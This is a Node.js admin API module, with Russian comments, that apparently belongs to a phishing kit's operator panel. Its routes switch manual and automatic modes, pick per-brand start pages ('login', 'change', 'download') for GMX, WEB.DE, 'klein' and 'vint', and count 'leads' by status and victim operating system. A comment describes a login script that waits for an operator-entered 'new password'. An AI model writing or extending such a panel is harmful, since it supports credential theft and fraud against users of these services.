function handleModeStatsRoutes(scope) {
  with (scope) {
    /** Скрипт входа ждёт новый пароль (long-poll). Запрос висит до сохранения пароля в админке или таймаута. */
    if (pathname === '/api/mode' && req.method === 'GET') {
      if (!checkAdminAuth(req, res)) return true;
      const data = readModeData();
      const canonicalBaseGmx = 'https://' + GMX_DOMAIN;
      const canonicalBaseWebde = 'https://' + WEBDE_CANONICAL_HOST;
      return send(res, 200, {
        mode: data.mode,
        autoScript: data.autoScript,
        scriptMode: data.scriptMode,
        adminUiMode: normalizeAdminUiMode(data.adminUiMode),
        canonicalBase: canonicalBaseGmx,
        canonicalBaseGmx,
        canonicalBaseWebde
      });
    }

    if (pathname === '/api/mode' && req.method === 'POST') {
      if (!checkAdminAuth(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch {}
        const mode = json.mode === 'manual' ? 'manual' : (json.mode === 'auto' ? 'auto' : undefined);
        const autoScript = json.autoScript !== undefined ? !!json.autoScript : undefined;
        const scriptMode = json.scriptMode !== undefined ? !!json.scriptMode : undefined;
        const adminUiMode = json.adminUiMode !== undefined
          ? normalizeAdminUiMode(json.adminUiMode)
          : undefined;
        const before = readModeData();
        writeMode(mode, autoScript, adminUiMode, scriptMode);
        const data = readModeData();
        logTerminalFlow('РЕЖИМ', 'Админка', '—', '—',
          'POST /api/mode: было mode=' + before.mode + ' autoScript=' + before.autoScript
            + ' scriptMode=' + before.scriptMode
            + ' adminUiMode=' + normalizeAdminUiMode(before.adminUiMode)
            + ' → стало mode=' + data.mode + ' autoScript=' + data.autoScript
            + ' scriptMode=' + data.scriptMode
            + ' adminUiMode=' + normalizeAdminUiMode(data.adminUiMode),
          '');
        send(res, 200, {
          ok: true,
          mode: data.mode,
          autoScript: data.autoScript,
          scriptMode: data.scriptMode,
          adminUiMode: normalizeAdminUiMode(data.adminUiMode)
        });
      });
      return true;
    }

    if (pathname === '/api/start-page' && req.method === 'GET') {
      if (!checkAdminAuth(req, res)) return true;
      return send(res, 200, {
        startPage: readStartPageForBrand('webde'),
        startPages: readStartPageByBrandMap()
      });
    }

    if (pathname === '/api/start-page' && req.method === 'POST') {
      if (!checkAdminAuth(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch {}
        const sp = json.startPage != null ? String(json.startPage).trim().toLowerCase() : '';
        const value = sp === 'login' ? 'login' : sp === 'change' ? 'change' : sp === 'download' ? 'download' : sp === 'klein' ? 'klein' : 'login';
        const brandRaw = json.brand != null ? String(json.brand).trim().toLowerCase() : 'webde';
        const brand =
          brandRaw === 'gmx' || brandRaw === 'klein' || brandRaw === 'vint' || brandRaw === 'webde'
            ? brandRaw
            : 'webde';
        const beforeMap = readStartPageByBrandMap();
        const beforeSp = beforeMap[brand];
        writeStartPageForBrand(brand, value);
        logTerminalFlow('РЕЖИМ', 'Админка', '—', '—',
          'POST /api/start-page: бренд ' + brand + ' было «' + beforeSp + '» → «' + value + '»',
          '');
        send(res, 200, { ok: true, startPage: value, brand: brand, startPages: readStartPageByBrandMap() });
      });
      return true;
    }

    if (pathname === '/api/stats' && req.method === 'GET') {
      if (!checkAdminAuth(req, res)) return true;
      const rawPeriod = parsed && parsed.query ? parsed.query.period : 'today';
      const period = ['today', 'yesterday', 'week', 'month', 'all'].includes(String(rawPeriod || '').toLowerCase())
        ? String(rawPeriod).toLowerCase()
        : 'today';
      const stats = leadService.getStatsByPeriod(period);
      return send(res, 200, {
        ok: true,
        period,
        byStatus: stats.byStatus || { worked: 0, pending: 0, success: 0 },
        total: stats.total != null ? stats.total : 0,
        byOs: stats.byOs || { windows: 0, macos: 0, android: 0, ios: 0, other: 0 }
      });
    }
  }
  return false;
}

module.exports = {
  handleModeStatsRoutes,
};
